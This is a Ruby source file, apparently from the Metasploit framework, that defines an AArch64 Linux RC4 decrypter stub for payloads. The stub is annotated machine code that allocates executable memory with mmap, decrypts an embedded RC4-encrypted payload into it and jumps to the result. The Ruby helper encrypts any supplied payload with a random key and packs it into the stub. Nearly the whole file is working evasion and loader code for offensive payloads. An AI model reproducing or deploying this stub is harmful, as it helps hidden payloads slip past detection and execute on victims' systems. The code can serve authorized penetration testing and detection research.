module Msf::Payload::Linux::Aarch64::Rc4Decrypter

    STUB_KEY_SIZE_OFFSET = 0x104
    STUB_PAYLOAD_SIZE_OFFSET = 0x10c
    STUB_ENCRYPTED_SIZE_OFFSET = 0x114
    STUB_KEY_DATA_OFFSET = 0x11c
    STUB_ENCRYPTED_DATA_OFFSET = 0x21c
  
    def rc4_decrypter_stub
      stub =  [0x1000086a,       # 0x00: adr x10, 0x10c              ; x10 -> payload_size
               0xf9400141,       # 0x04: ldr x1, [x10]               ; x1 = payload_size (mmap length)
               0xd2800000,       # 0x08: mov x0, #0                  ; addr = NULL (let kernel choose)
               0xd28000e2,       # 0x0c: mov x2, #7                  ; prot = PROT_READ|PROT_WRITE|PROT_EXEC
               0xd2800443,       # 0x10: mov x3, #34                 ; flags = MAP_PRIVATE|MAP_ANONYMOUS
               0x92800004,       # 0x14: mov x4, #-1                 ; fd = -1 (anonymous mapping)
               0xd2800005,       # 0x18: mov x5, #0                  ; offset = 0
               0xd2801bc8,       # 0x1c: mov x8, #222                ; syscall number for mmap (0xDE)
               0xd4000001,       # 0x20: svc #0                      ; invoke syscall
               0xaa0003f4,       # 0x24: mov x20, x0                 ; save mmap'd address in x20
                                 # === PART 2: Initialize S-box (256 bytes) on stack ===
               0xd10403ff,       # 0x28: sub sp, sp, #256            ; allocate 256 bytes for S-box
               0x910003e1,       # 0x2c: mov x1, sp                  ; x1 = S-box pointer
               0xd2800002,       # 0x30: mov x2, #0                  ; i = 0
                                 # S-box initialization loop: S[i] = i for i = 0..255
               0x38226822,       # 0x34: strb w2, [x1, x2]           ; S[i] = i
               0x91000442,       # 0x38: add x2, x2, #1              ; i++
               0xf104005f,       # 0x3c: cmp x2, #256
               0x54ffffa1,       # 0x40: b.ne 0x34                   ; loop until i == 256
  
               # === PART 3: RC4 Key Scheduling Algorithm (KSA) ===
               0x100006c0,       # 0x44: adr x0, 0x11c               ; x0 -> key_data
               0x100005ea,       # 0x48: adr x10, 0x104              ; x10 -> key_size
               0xf9400141,       # 0x4c: ldr x1, [x10]               ; x1 = key_size
               0x910003e2,       # 0x50: mov x2, sp                  ; x2 = S-box pointer
               0xd2800003,       # 0x54: mov x3, #0                  ; i = 0
               0xd2800004,       # 0x58: mov x4, #0                  ; j = 0
  
               # KSA loop: for i = 0..255
               0x38636845,       # 0x5c: ldrb w5, [x2, x3]           ; w5 = S[i]
               0x8b050084,       # 0x60: add x4, x4, x5              ; j += S[i]
               0x9ac10866,       # 0x64: udiv x6, x3, x1             ; x6 = i / key_size
               0x9b018cc6,       # 0x68: msub x6, x6, x1, x3         ; x6 = i % key_size (i - (i/key_size)*key_size)
               0x38666807,       # 0x6c: ldrb w7, [x0, x6]           ; w7 = key[i % key_size]
               0x8b070084,       # 0x70: add x4, x4, x7              ; j += key[i % key_size]
               0x92401c84,       # 0x74: and x4, x4, #255            ; j &= 0xFF
               0x38636845,       # 0x78: ldrb w5, [x2, x3]           ; w5 = S[i] (reload for swap)
               0x38646846,       # 0x7c: ldrb w6, [x2, x4]           ; w6 = S[j]
               0x38236846,       # 0x80: strb w6, [x2, x3]           ; S[i] = S[j]
               0x38246845,       # 0x84: strb w5, [x2, x4]           ; S[j] = S[i]
               0x91000463,       # 0x88: add x3, x3, #1              ; i++
               0xf104007f,       # 0x8c: cmp x3, #256
               0x54fffe61,       # 0x90: b.ne 0x5c                   ; loop until i == 256
  
               # === PART 4: RC4 Pseudo-Random Generation Algorithm (PRGA) ===
               0x10000c40,       # 0x94: adr x0, 0x21c               ; x0 -> encrypted_data
               0xaa1403e1,       # 0x98: mov x1, x20                 ; x1 = output buffer (mmap'd address)
               0x100003ca,       # 0x9c: adr x10, 0x114              ; x10 -> encrypted_size
               0xf9400142,       # 0xa0: ldr x2, [x10]               ; x2 = encrypted_size (loop count)
               0x910003e3,       # 0xa4: mov x3, sp                  ; x3 = S-box pointer
               0xd2800004,       # 0xa8: mov x4, #0                  ; i = 0
               0xd2800005,       # 0xac: mov x5, #0                  ; j = 0
               0xd2800006,       # 0xb0: mov x6, #0                  ; k = 0 (byte counter)
  
               # PRGA loop: for k = 0..encrypted_size-1
               0x91000484,       # 0xb4: add x4, x4, #1              ; i = (i + 1)
               0x92401c84,       # 0xb8: and x4, x4, #255            ; i &= 0xFF
               0x38646867,       # 0xbc: ldrb w7, [x3, x4]           ; w7 = S[i]
               0x8b0700a5,       # 0xc0: add x5, x5, x7              ; j += S[i]
               0x92401ca5,       # 0xc4: and x5, x5, #255            ; j &= 0xFF
               0x38656868,       # 0xc8: ldrb w8, [x3, x5]           ; w8 = S[j]
               0x38246868,       # 0xcc: strb w8, [x3, x4]           ; S[i] = S[j]
               0x38256867,       # 0xd0: strb w7, [x3, x5]           ; S[j] = S[i]
               0x8b0800e9,       # 0xd4: add x9, x7, x8              ; x9 = S[i] + S[j]
               0x92401d29,       # 0xd8: and x9, x9, #255            ; x9 &= 0xFF
               0x3869686a,       # 0xdc: ldrb w10, [x3, x9]          ; w10 = S[(S[i]+S[j]) & 0xFF] = keystream byte
               0x3866680b,       # 0xe0: ldrb w11, [x0, x6]          ; w11 = encrypted_data[k]
               0x4a0b014a,       # 0xe4: eor w10, w10, w11           ; w10 = keystream XOR encrypted = decrypted
               0x3826682a,       # 0xe8: strb w10, [x1, x6]          ; output[k] = decrypted byte
               0x910004c6,       # 0xec: add x6, x6, #1              ; k++
               0xeb0200df,       # 0xf0: cmp x6, x2                  ; compare k with encrypted_size
               0x54fffe01,       # 0xf4: b.ne 0xb4                   ; loop until k == encrypted_size
               0x910403ff,       # 0xf8: add sp, sp, #256            ; restore stack (deallocate S-box)
               0xaa1403e0,       # 0xfc: mov x0, x20                 ; x0 = decrypted payload address
               0xd61f0000        # 0x100: br x0                      ; jump to decrypted payload!
              ].pack('V*')  
  
      stub << ("\x00" * (STUB_ENCRYPTED_DATA_OFFSET - 260))
      stub
    end
  
    def rc4_decrypter(opts = {})
      key = opts[:key] || Rex::Text.rand_text(16)
      payload = opts[:data] || raise(ArgumentError, "Payload data required")

      encrypted_data = Rex::Crypto::Rc4.rc4(key, payload)
      payload_size = encrypted_data.length
      stub = rc4_decrypter_stub.dup
  
      stub[STUB_KEY_SIZE_OFFSET, 8] = [key.length].pack('Q<')
      stub[STUB_PAYLOAD_SIZE_OFFSET, 8] = [payload.length].pack('Q<')
      stub[STUB_ENCRYPTED_SIZE_OFFSET, 8] = [encrypted_data.length].pack('Q<')
  
      stub[STUB_KEY_DATA_OFFSET, 256] = key.ljust(256, "\x00")
  
      stub + encrypted_data
    end
  
    def stub_size
      STUB_ENCRYPTED_DATA_OFFSET
    end
  
  end
